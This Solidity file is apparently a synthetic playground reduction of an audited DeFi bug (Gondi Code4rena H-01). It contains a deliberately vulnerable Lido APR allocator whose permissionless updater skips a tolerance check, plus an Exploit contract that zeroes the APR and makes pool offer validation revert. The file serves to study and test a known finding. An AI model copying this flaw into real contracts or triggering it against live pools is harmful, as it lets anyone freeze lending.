// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Gondi — updateLidoValues can write a 0 Lido APR (Code4rena 2024-06, H-01, #35262).
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: updateLidoValues is permissionless and does not check getLidoUpdateTolerance.
    Between stETH rebases the share rate is flat, so a short window annualizes to 0 bps.
    getBaseAprWithUpdate then reverts InvalidAprError, and the pool cannot validate offers.
    Audited formula preserved below (@> VULN). No warp: lastTs is stored 12 seconds behind
    the single block timestamp (or 0 when the clock is still 1).

    Repo: code-423n4/2024-06-gondi @ ab1411814ca9323c5d427739f5771d3907dbea31
    LidoEthBaseInterestAllocator.updateLidoValues / _updateLidoValues / getBaseAprWithUpdate.
    The tolerance gate on getBaseAprWithUpdate is the audited check this function skips. */

library Terms {
    uint16 internal constant APR_BEFORE = 1000;
    uint16 internal constant APR_AFTER = 0;
    uint96 internal constant TOLERANCE = 1 days;
    uint256 internal constant WINDOW = 12;
}

/// stETH share rate. Flat across this block: no rebase has landed.
contract Lido {
    uint256 public pooledEther = 1_000_000 ether;
    uint256 public shares = 1_000_000 ether;

    function getTotalPooledEther() external view returns (uint256) {
        return pooledEther;
    }

    function getTotalShares() external view returns (uint256) {
        return shares;
    }
}

/// Reduced LidoEthBaseInterestAllocator. updateLidoValues skips the tolerance check.
contract LidoAllocator {
    uint256 private constant _BPS = 10000;
    uint256 private constant _SECONDS_PER_YEAR = 365 days;

    struct LidoData {
        uint96 lastTs;
        uint144 shareRate;
        uint16 aprBps;
    }

    Lido public lido;
    uint96 public immutable getLidoUpdateTolerance;
    LidoData public getLidoData;

    error InvalidAprError();

    constructor(Lido _lido, uint96 tolerance) {
        lido = _lido;
        getLidoUpdateTolerance = tolerance;
    }

    function seed(uint96 lastTs, uint16 aprBps) external {
        uint256 shareRate = _currentShareRate();
        getLidoData = LidoData(lastTs, uint144(shareRate), aprBps);
    }

    /// Audited getBaseAprWithUpdate. Refreshes only after the tolerance, then rejects 0.
    function getBaseAprWithUpdate() external returns (uint256) {
        LidoData memory lidoData = getLidoData;
        if (block.timestamp - lidoData.lastTs > getLidoUpdateTolerance) {
            _updateLidoValues(lidoData);
        }
        if (lidoData.aprBps == 0) {
            revert InvalidAprError();
        }
        return lidoData.aprBps;
    }

    /// @notice Triggger update. Permissionless. The tolerance check is not here.
    function updateLidoValues() external {
        _updateLidoValues(getLidoData);
    }

    function _currentShareRate() private view returns (uint256) {
        return lido.getTotalPooledEther() * 1e27 / lido.getTotalShares();
    }

    function _updateLidoValues(LidoData memory _lidoData) private {
        uint256 shareRate = _currentShareRate();
        // @> VULN: no getLidoUpdateTolerance check, so a flat share rate over a short window writes aprBps 0.
        _lidoData.aprBps = uint16(
            (_BPS * _SECONDS_PER_YEAR * (shareRate - _lidoData.shareRate)) / _lidoData.shareRate
                / (block.timestamp - _lidoData.lastTs)
        );
        // FIX: only call _updateLidoValues when block.timestamp - lastTs > getLidoUpdateTolerance.
        _lidoData.shareRate = uint144(shareRate);
        _lidoData.lastTs = uint96(block.timestamp);
        getLidoData = _lidoData;
    }
}

/// Pool lending asks the allocator for a base APR before it will open a loan.
contract Pool {
    LidoAllocator public allocator;
    uint256 public quotedApr;

    constructor(LidoAllocator _allocator) {
        allocator = _allocator;
    }

    function validateOffer() external returns (uint256 apr) {
        apr = allocator.getBaseAprWithUpdate();
        quotedApr = apr;
    }
}

contract Exploit {
    Lido public lido; // CREATE nonce 1
    LidoAllocator public allocator; // CREATE nonce 2
    Pool public pool; // CREATE nonce 3

    uint256 public quoteBefore;
    uint256 public aprAfter;
    uint256 public poolReverted;

    constructor() {
        lido = new Lido();
        allocator = new LidoAllocator(lido, Terms.TOLERANCE);
        pool = new Pool(allocator);
    }

    function run() external {
        uint256 nowTs = block.timestamp;
        uint256 last = nowTs > Terms.WINDOW ? nowTs - Terms.WINDOW : 0;
        allocator.seed(uint96(last), Terms.APR_BEFORE);

        uint256 quote = allocator.getBaseAprWithUpdate();
        quoteBefore = quote;
        require(quoteBefore == Terms.APR_BEFORE, "quote");

        allocator.updateLidoValues();

        (, , uint16 apr) = allocator.getLidoData();
        aprAfter = apr;
        require(aprAfter == Terms.APR_AFTER, "apr");

        (bool ok,) = address(pool).call(abi.encodeWithSignature("validateOffer()"));
        if (!ok) {
            poolReverted = 1;
        }
        require(poolReverted == 1, "pool did not revert");
        require(pool.quotedApr() == 0, "offer was quoted");
        require(quoteBefore == 1000 && aprAfter == 0, "1000 to 0");
    }
}
